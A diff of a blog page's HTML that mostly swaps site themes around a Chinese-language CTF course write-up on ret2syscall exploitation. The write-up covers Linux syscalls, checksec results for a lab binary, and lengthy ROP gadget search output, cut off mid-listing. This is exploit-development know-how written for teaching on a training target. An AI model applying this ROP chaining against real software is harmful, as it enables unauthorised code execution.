@@ -1,36 +1,239 @@
-<!doctype html>
-<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta><title>pwn-ret2syscall - LeonChow</title><link rel="manifest" href="/manifest.json"><meta name="application-name" content="LeonChow"><meta name="msapplication-TileImage" content="/img/favicon.svg"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="LeonChow"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta name="description" content="pwn-ret2syscallsyscall简介syscall 就是连接用户态和内核态的桥梁 Linux系统中 用户空间通过向内核空间发出syscall 产生软中断从而让程序陷入内核态 执行相应的操作 而对于每个系统调用都会有一个对应的系统调用号 系统调用提供用户程序与操作系统间的接口 部分库函数(scanf、puts)等IO相关的函数实际上是对系统调用的封装(read和write) &amp;#x2F;usr&amp;#x2F;i"><meta property="og:type" content="blog"><meta property="og:title" content="pwn-ret2syscall"><meta property="og:url" content="http://example.com/2025/06/06/pwn-ret2syscall/"><meta property="og:site_name" content="LeonChow"><meta property="og:description" content="pwn-ret2syscallsyscall简介syscall 就是连接用户态和内核态的桥梁 Linux系统中 用户空间通过向内核空间发出syscall 产生软中断从而让程序陷入内核态 执行相应的操作 而对于每个系统调用都会有一个对应的系统调用号 系统调用提供用户程序与操作系统间的接口 部分库函数(scanf、puts)等IO相关的函数实际上是对系统调用的封装(read和write) &amp;#x2F;usr&amp;#x2F;i"><meta property="og:locale" content="en_US"><meta property="og:image" content="http://example.com/2025/06/06/pwn-ret2syscall/image-20250606154933187.png"><meta property="og:image" content="http://example.com/2025/06/06/pwn-ret2syscall/QQ%E6%88%AA%E5%9B%BE20250606153717.png"><meta property="article:published_time" content="2025-06-06T07:29:21.000Z"><meta property="article:modified_time" content="2025-06-06T12:00:53.650Z"><meta property="article:author" content="Chow"><meta property="article:tag" content="pwn"><meta property="twitter:card" content="summary"><meta property="twitter:image:src" content="http://example.com/2025/06/06/pwn-ret2syscall/image-20250606154933187.png"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"http://example.com/2025/06/06/pwn-ret2syscall/"},"headline":"pwn-ret2syscall","image":["http://example.com/2025/06/06/pwn-ret2syscall/image-20250606154933187.png","http://example.com/2025/06/06/pwn-ret2syscall/QQ%E6%88%AA%E5%9B%BE20250606153717.png"],"datePublished":"2025-06-06T07:29:21.000Z","dateModified":"2025-06-06T12:00:53.650Z","author":{"@type":"Person","name":"Chow"},"publisher":{"@type":"Organization","name":"LeonChow","logo":{"@type":"ImageObject","url":"http://example.com/img/logo.svg"}},"description":"pwn-ret2syscallsyscall简介syscall 就是连接用户态和内核态的桥梁 Linux系统中 用户空间通过向内核空间发出syscall 产生软中断从而让程序陷入内核态 执行相应的操作 而对于每个系统调用都会有一个对应的系统调用号 系统调用提供用户程序与操作系统间的接口 部分库函数(scanf、puts)等IO相关的函数实际上是对系统调用的封装(read和write) &#x2F;usr&#x2F;i"}</script><link rel="canonical" href="http://example.com/2025/06/06/pwn-ret2syscall/"><link rel="icon" href="/img/favicon.svg"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v6.0.0/css/all.css"><link data-pjax rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@11.7.0/styles/atom-one-light.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link data-pjax rel="stylesheet" href="/css/default.css"><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><!--!--><!--!--><!--!--><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.10.0/dist/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/css/justifiedGallery.min.css"><!--!--><!--!--><!--!--><style>.pace{-webkit-pointer-events:none;pointer-events:none;-webkit-user-select:none;-moz-user-select:none;user-select:none}.pace-inactive{display:none}.pace .pace-progress{background:#3273dc;position:fixed;z-index:2000;top:0;right:100%;width:100%;height:2px}</style><script src="https://cdn.jsdelivr.net/npm/pace-js@1.2.4/pace.min.js"></script><!--!--><!--!--><!-- hexo injector head_end start --><script>
-  (function () {
-      function switchTab() {
-          if (!location.hash) {
-            return;
-          }
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
 
-          const id = '#' + CSS.escape(location.hash.substring(1));
-          const $tabMenu = document.querySelector(`.tabs a[href="${id}"]`);
-          if (!$tabMenu) {
-            return;
-          }
+<link rel="stylesheet" href="/css/main.css">
 
-          const $tabMenuContainer = $tabMenu.parentElement.parentElement;
-          Array.from($tabMenuContainer.children).forEach($menu => $menu.classList.remove('is-active'));
-          Array.from($tabMenuContainer.querySelectorAll('a'))
-              .map($menu => document.getElementById($menu.getAttribute("href").substring(1)))
-              .forEach($content => $content.classList.add('is-hidden'));
 
-          if ($tabMenu) {
-              $tabMenu.parentElement.classList.add('is-active');
-          }
-          const $activeTab = document.querySelector(id);
-          if ($activeTab) {
-              $activeTab.classList.remove('is-hidden');
-          }
-      }
-      switchTab();
-      window.addEventListener('hashchange', switchTab, false);
-  })();
-  </script><!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="LeonChow" type="application/atom+xml">
-</head><body class="is-2-column"><nav class="navbar navbar-main"><div class="container navbar-container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/"><img src="/img/logo.svg" alt="LeonChow" height="28"></a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">Home</a><a class="navbar-item" href="/archives">Archives</a><a class="navbar-item" href="/categories">Categories</a><a class="navbar-item" href="/tags">Tags</a><a class="navbar-item" href="/about">About</a></div><div class="navbar-end"><a class="navbar-item" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/ppoffice/hexo-theme-icarus"><i class="fab fa-github"></i></a><a class="navbar-item search" title="Search" href="javascript:;"><i class="fas fa-search"></i></a></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-8-widescreen"><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item">Posted&nbsp;<time dateTime="2025-06-06T07:29:21.000Z" title="2025/6/6 15:29:21">2025-06-06</time></span><span class="level-item">Updated&nbsp;<time dateTime="2025-06-06T12:00:53.650Z" title="2025/6/6 20:00:53">2025-06-06</time></span><span class="level-item">an hour read (About 6963 words)</span></div></div><h1 class="title is-3 is-size-4-mobile">pwn-ret2syscall</h1><div class="content"><h1 id="pwn-ret2syscall"><a href="#pwn-ret2syscall" class="headerlink" title="pwn-ret2syscall"></a>pwn-ret2syscall</h1><h2 id="syscall简介"><a href="#syscall简介" class="headerlink" title="syscall简介"></a>syscall简介</h2><p><code>syscall</code> 就是连接用户态和内核态的桥梁 Linux系统中 <code>用户空间通过向内核空间发出syscall 产生软中断从而让程序陷入内核态 执行相应的操作</code> 而对于每个系统调用都会有一个对应的系统调用号 系统调用提供用户程序与操作系统间的接口 部分库函数(scanf、puts)等IO相关的函数实际上是对系统调用的封装(read和write)</p>
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.json"};
+  </script>
+
+  <meta name="description" content="pwn-ret2syscallsyscall简介syscall 就是连接用户态和内核态的桥梁 Linux系统中 用户空间通过向内核空间发出syscall 产生软中断从而让程序陷入内核态 执行相应的操作 而对于每个系统调用都会有一个对应的系统调用号 系统调用提供用户程序与操作系统间的接口 部分库函数(scanf、puts)等IO相关的函数实际上是对系统调用的封装(read和write) &#x2F;usr&#x2F;i">
+<meta property="og:type" content="article">
+<meta property="og:title" content="pwn-ret2syscall">
+<meta property="og:url" content="http://example.com/2025/06/06/pwn-ret2syscall/index.html">
+<meta property="og:site_name" content="LeonChow">
+<meta property="og:description" content="pwn-ret2syscallsyscall简介syscall 就是连接用户态和内核态的桥梁 Linux系统中 用户空间通过向内核空间发出syscall 产生软中断从而让程序陷入内核态 执行相应的操作 而对于每个系统调用都会有一个对应的系统调用号 系统调用提供用户程序与操作系统间的接口 部分库函数(scanf、puts)等IO相关的函数实际上是对系统调用的封装(read和write) &#x2F;usr&#x2F;i">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2025/06/06/pwn-ret2syscall/image-20250606154933187.png">
+<meta property="og:image" content="http://example.com/2025/06/06/pwn-ret2syscall/QQ%E6%88%AA%E5%9B%BE20250606153717.png">
+<meta property="article:published_time" content="2025-06-06T07:29:21.000Z">
+<meta property="article:modified_time" content="2025-06-06T12:06:50.629Z">
+<meta property="article:author" content="Chow">
+<meta property="article:tag" content="pwn">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2025/06/06/pwn-ret2syscall/image-20250606154933187.png">
+
+<link rel="canonical" href="http://example.com/2025/06/06/pwn-ret2syscall/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>pwn-ret2syscall | LeonChow</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="LeonChow" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">LeonChow</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2025/06/06/pwn-ret2syscall/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://octodex.github.com/images/steroidtocat.png">
+      <meta itemprop="name" content="Chow">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="LeonChow">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          pwn-ret2syscall
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2025-06-06 15:29:21 / 修改时间：20:06:50" itemprop="dateCreated datePublished" datetime="2025-06-06T15:29:21+08:00">2025-06-06</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="pwn-ret2syscall"><a href="#pwn-ret2syscall" class="headerlink" title="pwn-ret2syscall"></a>pwn-ret2syscall</h1><h2 id="syscall简介"><a href="#syscall简介" class="headerlink" title="syscall简介"></a>syscall简介</h2><p><code>syscall</code> 就是连接用户态和内核态的桥梁 Linux系统中 <code>用户空间通过向内核空间发出syscall 产生软中断从而让程序陷入内核态 执行相应的操作</code> 而对于每个系统调用都会有一个对应的系统调用号 系统调用提供用户程序与操作系统间的接口 部分库函数(scanf、puts)等IO相关的函数实际上是对系统调用的封装(read和write)</p>
 <p><code>/usr/include/x86_64-linux-gnu/asm/unistd_64.h</code></p>
 <p><code>/usr/include/x86_64-linux-gnu/asm/unistd_32.h</code></p>
 <span id="more"></span>
@@ -98,26 +301,7 @@
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">(Pwn-py312) (base) cccccchow@Chow:~/pwn/AAA/山化课程/day03-ret2syscall$ checksec ret2syscall</span><br><span class="line">[*] <span class="string">&#x27;/home/cccccchow/pwn/AAA/山化课程/day03-ret2syscall/ret2syscall&#x27;</span></span><br><span class="line">    Arch:       amd64-64-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x400000)</span><br><span class="line">    Stripped:   No</span><br></pre></td></tr></table></figure>
 
 <p>发现开启了NX保护 也就是说栈不可执行 然后再IDA里面也没有看到 <code>system</code> 以及 <code>execve</code> 等函数</p>
-<p>所以我们就要去构造系统调用了 先搜索一遍</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><span class="line">(ret2syscall/ELF/x86_64)&gt; search syscall</span><br><span class="line">[INFO] Searching <span class="keyword">for</span> gadgets: syscall</span><br><span class="line"></span><br><span class="line">[INFO] File: ret2syscall</span><br><span class="line">0x00000000004003da: syscall; </span><br><span class="line">0x000000000046a96e: syscall; add rsp, 0x98; xor eax, eax; pop rbx; pop rbp; ret; </span><br><span class="line">0x000000000043f885: syscall; cmp rax, -0x1000; ja 0x3f8d0; add rsp, 0x60; pop rbx; ret; </span><br><span class="line">0x000000000046ac85: syscall; cmp rax, -0x1000; ja 0x6ac98; pop rbx; ret; </span><br><span class="line">0x000000000043f5a5: syscall; cmp rax, -0xfff; jae 0x44810; ret; </span><br><span class="line">0x000000000047e352: syscall; jmp 0x7e2a5; nop dword ptr [rax]; call rax; </span><br><span class="line">0x0000000000442b87: syscall; pop rdx; pop rsi; ret; </span><br><span class="line">0x000000000047cbed: syscall; <span class="built_in">test</span> edx, edx; jne 0x7cbcf; mov dword ptr fs:[0x2d0], eax; ret; </span><br><span class="line">0x0000000000467685: syscall; ret; </span><br><span class="line"></span><br><span class="line">(ret2syscall/ELF/x86_64)&gt; search pop rax</span><br><span class="line">[INFO] Searching <span class="keyword">for</span> gadgets: pop rax</span><br><span class="line"></span><br><span class="line">[INFO] File: ret2syscall</span><br><span class="line">0x00000000004c3ecd: pop rax; add byte ptr [rax], al; nop; ret; </span><br><span class="line">0x000000000044faba: pop rax; add rax, 0x200; mov qword ptr fs:[rdx], rax; ret; </span><br><span class="line">0x00000000004c4c18: pop rax; <span class="keyword">in</span> eax, 0xf9; jmp rax; </span><br><span class="line">0x0000000000418b12: pop rax; mov dword ptr [rdi + 4], eax; ret; </span><br><span class="line">0x000000000049bd15: pop rax; mov eax, dword ptr [rbx + 8]; movsxd rax, dword ptr [r14 + rax*4]; add rax, r14; jmp rax; </span><br><span class="line">0x0000000000478856: pop rax; pop rdx; pop rbx; ret; </span><br><span class="line">0x00000000004bc790: pop rax; ret 0x4b; </span><br><span class="line">0x0000000000409b44: pop rax; ret 0xffff; </span><br><span class="line">0x00000000004c0858: pop rax; cmc; jmp qword ptr [rdi + 1]; </span><br><span class="line">0x00000000004bc808: pop rax; ret; </span><br><span class="line"></span><br><span class="line">(ret2syscall/ELF/x86_64)&gt; search pop rdi</span><br><span class="line">[INFO] Searching <span class="keyword">for</span> gadgets: pop rdi</span><br><span class="line"></span><br><span class="line">[INFO] File: ret2syscall</span><br><span class="line">0x00000000004c45e5: pop rdi; add byte ptr [rax], al; <span class="built_in">test</span> al, 9; stc; call qword ptr [rsi + 0x2b]; </span><br><span class="line">0x000000000042c1ad: pop rdi; add eax, dword ptr [rax]; add byte ptr [rax - 0x7d], cl; ret 0x4910; </span><br><span class="line">0x00000000004886cd: pop rdi; and al, 0; jae 0x886df; mov rdx, qword ptr [rip + 0x24445e]; add word ptr [rdx + rax*2], 1; ret; </span><br><span class="line">0x0000000000431f29: pop rdi; <span class="keyword">in</span> al, dx; mov qword ptr [rdi - 0xc], rcx; mov dword ptr [rdi - 4], edx; ret; </span><br><span class="line">0x0000000000431d39: pop rdi; <span class="keyword">in</span> eax, dx; mov qword ptr [rdi - 0xb], rcx; mov dword ptr [rdi - 4], edx; ret; </span><br><span class="line">0x00000000004ba99e: pop rdi; insd dword ptr [rdi], dx; <span class="built_in">test</span> eax, 0x7d4c8c5d; ret 0xd8f; </span><br><span class="line">0x00000000004320fa: pop rdi; jmp 0x32145; mov dword ptr [rdi - 0xd], ecx; mov qword ptr [rdi - 8], rdx; ret; </span><br><span class="line">0x0000000000432142: pop rdi; jmp 0x3218d; mov dword ptr [rdi - 0xd], ecx; mov qword ptr [rdi - 8], rdx; ret; </span><br><span class="line">0x0000000000432180: pop rdi; jmp 0x321cb; mov dword ptr [rdi - 0xd], ecx; mov qword ptr [rdi - 8], rdx; ret; </span><br><span class="line">0x00000000004321bc: pop rdi; jmp 0x32207; mov dword ptr [rdi - 0xd], ecx; mov qword ptr [rdi - 8], rdx; ret; </span><br><span class="line">0x00000000004321f6: pop rdi; jmp 0x32241; mov dword ptr [rdi - 0xd], ecx; mov qword ptr [rdi - 8], rdx; ret; </span><br><span class="line">0x000000000043222e: pop rdi; jmp 0x32279; mov dword ptr [rdi - 0xd], ecx; mov qword ptr [rdi - 8], rdx; ret; </span><br><span class="line">0x0000000000432256: pop rdi; jmp 0x322a1; mov dword ptr [rdi - 0xd], ecx; mov qword ptr [rdi - 8], rdx; ret; </span><br><span class="line">0x000000000043227e: pop rdi; jmp 0x322c9; mov dword ptr [rdi - 0xd], ecx; mov qword ptr [rdi - 8], rdx; ret; </span><br><span class="line">0x00000000004324fa: pop rdi; jmp 0xfffffffff152ae48; mov qword ptr [rdi - 8], rdx; ret; </span><br><span class="line">0x0000000000432542: pop rdi; jmp 0xfffffffff152ae90; mov qword ptr [rdi - 8], rdx; ret; </span><br><span class="line">0x0000000000432580: pop rdi; jmp 0xfffffffff152aece; mov qword ptr [rdi - 8], rdx; ret; </span><br><span class="line">0x00000000004325b8: pop rdi; jmp 0xfffffffff152af06; mov qword ptr [rdi - 8], rdx; ret; </span><br><span class="line">0x00000000004325f6: pop rdi; jmp 0xfffffffff152af44; mov qword ptr [rdi - 8], rdx; ret; </span><br><span class="line">0x000000000043262e: pop rdi; jmp 0xfffffffff152af7c; mov qword ptr [rdi - 8], rdx; ret; </span><br><span class="line">0x0000000000432656: pop rdi; jmp 0xfffffffff152afa4; mov qword ptr [rdi - 8], rdx; ret; </span><br><span class="line">0x000000000043267e: pop rdi; jmp 0xfffffffff152afcc; mov qword ptr [rdi - 8], rdx; ret; </span><br><span class="line">0x0000000000441ab2: pop rdi; jmp rax; </span><br><span class="line">0x000000000043b50d: pop rdi; mov al, byte ptr [rsi]; add byte ptr [rcx + 0x63], cl; or al, 0x93; lea rcx, [r11 + rcx]; jmp rcx; </span><br><span class="line">0x00000000004b9961: pop rdi; mov dh, 0x4e; ret 0x474c; </span><br><span class="line">0x000000000049e57e: pop rdi; mov rax, rbx; pop rbx; pop rbp; pop r12; ret; </span><br><span class="line">0x0000000000431b59: pop rdi; out dx, al; mov qword ptr [rdi - 0xa], rcx; mov dword ptr [rdi - 4], edx; ret; </span><br><span class="line">0x0000000000431989: pop rdi; out dx, eax; mov qword ptr [rdi - 9], r8; mov dword ptr [rdi - 4], edx; ret; </span><br><span class="line">0x0000000000431a85: pop rdi; out dx, eax; mov qword ptr [rdi - 9], rcx; mov byte ptr [rdi - 1], dl; ret; </span><br><span class="line">0x00000000004319d1: pop rdi; out dx, eax; mov qword ptr [rdi - 9], rcx; mov dword ptr [rdi - 4], edx; ret; </span><br><span class="line">0x000000000040224a: pop rdi; pop rbp; ret; </span><br><span class="line">0x00000000004c05a1: pop rdi; cmc; jmp qword ptr [rsi + 2]; </span><br><span class="line">0x0000000000401626: pop rdi; ret; </span><br><span class="line"></span><br><span class="line">(ret2syscall/ELF/x86_64)&gt; search pop rsi</span><br><span class="line">[INFO] Searching <span class="keyword">for</span> gadgets: pop rsi</span><br><span class="line"></span><br><span class="line">[INFO] File: ret2syscall</span><br><span class="line">0x000000000042c0ae: pop rsi; add al, 0; add byte ptr [rax - 0x7d], cl; ret 0xe910; </span><br><span class="line">0x000000000044b242: pop rsi; add al, bpl; xchg byte ptr [rsi - 5], ah; jmp qword ptr [rsi + 0xf]; </span><br><span class="line">0x0000000000473e13: pop rsi; add dword ptr [rax], eax; add byte ptr [rax + 0x39], cl; ret 0xf48; </span><br><span class="line">0x000000000042642c: pop rsi; add dword ptr [rax], eax; ret; </span><br><span class="line">0x000000000047377c: pop rsi; add r8b, bpl; loope 0x7377b; jmp qword ptr [rsi + 0x2e]; </span><br><span class="line">0x00000000004886d6: pop rsi; and al, 0; add word ptr [rdx + rax*2], 1; ret; </span><br><span class="line">0x0000000000426ed2: pop rsi; and byte ptr [rbx + rcx*4 + 0x66], cl; sub byte ptr [rbx + rcx*4 + 0x6e], cl; xor byte ptr [rbx + rcx*4 + 0x76], cl; cmp byte ptr [rax + 0xf], cl; ret; </span><br><span class="line">0x000000000048f191: pop rsi; fmul st(0); ret; </span><br><span class="line">0x000000000048f10f: pop rsi; fmulp st(1); ret; </span><br><span class="line">0x000000000042cbb5: pop rsi; or byte ptr [rax - 0x7d], cl; ret 0x4801; </span><br><span class="line">0x0000000000441ab0: pop rsi; pop r15; jmp rax; </span><br><span class="line">0x0000000000402248: pop rsi; pop r15; pop rbp; ret; </span><br><span class="line">0x0000000000401624: pop rsi; pop r15; ret; </span><br><span class="line">0x00000000004b96dc: pop rsi; sar byte ptr [rip + 0x733db8a1], 0xd7; jo 0xb9757; mov ebp, 0xfb67d10d; ret; </span><br><span class="line">0x0000000000401747: pop rsi; ret; </span><br><span class="line"></span><br><span class="line">(ret2syscall/ELF/x86_64)&gt; search pop rdx</span><br><span class="line">[INFO] Searching <span class="keyword">for</span> gadgets: pop rdx</span><br><span class="line"></span><br><span class="line">[INFO] File: ret2syscall</span><br><span class="line">0x0000000000426099: pop rdx; add byte ptr [rax + 0x43da10], dil; cmove rax, rdx; ret; </span><br><span class="line">0x00000000004c40dd: pop rdx; add byte ptr [rax], al; jo 0xc409b; clc; call qword ptr [rcx]; </span><br><span class="line">0x00000000004c40f5: pop rdx; add byte ptr [rax], al; js 0xc40b3; clc; call qword ptr [rsi]; </span><br><span class="line">0x00000000004269cb: pop rdx; add r11b, sil; ret; </span><br><span class="line">0x0000000000461e20: pop rdx; ja 0x5ffb0; movzx eax, byte ptr [rax + 0x4b4060]; mov dword ptr [rbp - 0x1088], 1; mov rax, qword ptr [rax*8 + 0x4b3ba0]; jmp rax; </span><br><span class="line">0x0000000000460618: pop rdx; ja 0x5ffb0; movzx eax, byte ptr [rax + 0x4b4060]; mov dword ptr [rbp - 0x1090], 1; mov rax, qword ptr [rax*8 + 0x4b39a0]; jmp rax; </span><br><span class="line">0x0000000000461b85: pop rdx; ja 0x5ffb0; movzx eax, byte ptr [rax 